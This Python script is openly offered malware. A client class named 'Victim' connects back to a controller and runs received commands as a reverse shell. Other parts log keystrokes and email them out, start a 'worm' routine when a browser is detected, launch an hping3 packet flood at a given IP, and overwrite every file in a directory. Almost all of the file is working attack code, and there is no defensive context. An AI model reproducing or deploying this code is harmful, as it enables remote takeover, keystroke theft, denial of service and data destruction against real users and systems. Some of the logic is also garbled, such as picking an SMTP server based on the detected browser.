import smtplib
import os
import socket
import time
import psutil
import subprocess
import keyboard
import winreg
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import paramiko


class EmailSender:
    def __init__(self, smtp_server, smtp_port, username, password):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.username = username
        self.password = password

    def send_email_with_attachment(self, subject, message, attachment_path):
        # Create a multipart message
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = self.username  # Send the email to yourself
        msg['Subject'] = subject

        # Add message body
        msg.attach(MIMEText(message, 'plain'))

        # Add attachment
        attachment_filename = os.path.basename(attachment_path)
        with open(attachment_path, "rb") as attachment_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {attachment_filename}")
            msg.attach(part)

        # Send the email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.login(self.username, self.password)
                server.send_message(msg)
            print("Email sent successfully!")
        except smtplib.SMTPException as e:
            print("Failed to send email. Error:", str(e))


class Victim:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.client = None

    def connect_to_server(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client Initiated...")
        self.client.connect((self.server_ip, self.server_port))
        print("Msg: Connection initiated...")

    def online_interaction(self):
        while True:
            print("[+] Awaiting Shell Commands...")
            user_command = self.client.recv(1024).decode()

            if user_command.strip() == "exit":
                break

            if user_command.startswith("Attack"):
                command_parts = user_command.split()
                if len(command_parts) == 2:
                    ip_address = command_parts[1]
                    self.send_packets(ip_address)
            elif user_command.strip() == "StartRecording":
                self.start_recording()
            elif user_command.strip() == "StartWormActions":
                self.start_worm_actions()
            else:
                op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()

                print("[+] Sending Command Output...")
                if output == b"" and output_error == b"":
                    self.client.send(b"client_msg: no visible output")
                else:
                    self.client.send(output + output_error)

    def send_email_with_keystrokes(self, keystrokes):
        smtp_server, smtp_port = self.get_smtp_server_info()

        email_sender = EmailSender(smtp_server, smtp_port, "your_email@example.com", "your_password")

        subject = 'Keystroke Log'
        message = f'Keystrokes captured: {keystrokes}'
        attachment_path = os.path.abspath(__file__)  # Attach the current script file

        email_sender.send_email_with_attachment(subject, message, attachment_path)

    def start_recording(self):
        recorded_keystrokes = []

        def record_keystroke(event):
            if event.event_type == "down":
                if event.name == "space":
                    recorded_keystrokes.append(" ")
                else:
                    recorded_keystrokes.append(event.name)

        keyboard.hook(record_keystroke)

        print("Recording keystrokes. Press Enter to stop...")
        input()

        keyboard.unhook(record_keystroke)

        keystrokes = " ".join(recorded_keystrokes)
        self.send_email_with_keystrokes(keystrokes)

    def start_worm_actions(self):
        print("Waiting for network connection...")
        while True:
            try:
                # Try to establish a connection to a known host
                socket.create_connection(("www.example.com", 80))
                break
            except OSError:
                # Network connection failed, wait for a while before retrying
                time.sleep(10)
        print("Network connected.")

        print("Waiting for web browser activity...")
        while not self.is_browser_active():
            time.sleep(2)
        print("Web browser detected. Starting keystroke recording.")

        self.start_recording()

    def is_browser_active(self):
        for process in psutil.process_iter(['name']):
            if process.info['name'].lower() in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
                return True
        return False

    def send_packets(self, ip_address):
        hping_command = f"hping3 {ip_address} -d 65535 -c 0"
        process = subprocess.Popen(hping_command, shell=True)

    def get_smtp_server_info(self):
        browsers = {
            "chrome": {"smtp_server": "smtp.gmail.com", "smtp_port": 587},
            "firefox": {"smtp_server": "smtp.mozilla.org", "smtp_port": 587},
            "safari": {"smtp_server": "smtp.apple.com", "smtp_port": 587},
            "opera": {"smtp_server": "smtp.opera.com", "smtp_port": 587}
        }

        detected_browsers = self.detect_browsers()

        for browser_name in detected_browsers:
            if browser_name.lower() in browsers:
                return browsers[browser_name.lower()]["smtp_server"], browsers[browser_name.lower()]["smtp_port"]

        # Default SMTP server information if browser detection fails
        return "smtp.example.com", 587

    def detect_browsers(self):
        detected_browsers = []

        # Check running processes for known browser names
        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in ['chrome.exe', 'firefox.exe', 'safari.exe', 'opera.exe']:
                browser_name = os.path.splitext(process_name)[0]
                detected_browsers.append(browser_name)

        # Check Windows registry for browser information
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as start_menu_key:
                num_subkeys = winreg.QueryInfoKey(start_menu_key)[0]
                for i in range(num_subkeys):
                    subkey_name = winreg.EnumKey(start_menu_key, i)
                    detected_browsers.append(subkey_name)
        except OSError:
            pass

        return detected_browsers


def rewrite_files_in_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            rewrite_file(file_path)


def rewrite_file(file_path):
    print(f"Rewriting file: {file_path}")
    with open(file_path, "w") as file:
        file.write("This file has been modified by a malicious program.")


def ssh_to_server(host, port, username, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(host, port, username, password)
        print("Connected to the server via SSH.")

        command = "ls"
        stdin, stdout, stderr = ssh_client.exec_command(command)
        output = stdout.read().decode()
        print(f"Command output:\n{output}")

        ssh_client.close()
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
    except paramiko.SSHException as e:
        print("SSH connection failed:", str(e))
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Unable to connect to the server.")
    except socket.gaierror:
        print("Invalid server hostname.")
    except socket.timeout:
        print("Connection timed out.")


def main():
    # Victim settings
    victim_ip = "192.168.0.100"
    victim_port = 1234

    # Connect to the server
    victim = Victim(victim_ip, victim_port)
    victim.connect_to_server()

    # Perform online interaction with the server
    victim.online_interaction()

    # Perform additional actions (optional)
    # rewrite_files_in_directory("/path/to/directory")
    # ssh_to_server("example.com", 22, "username", "password")


if __name__ == "__main__":
    main()
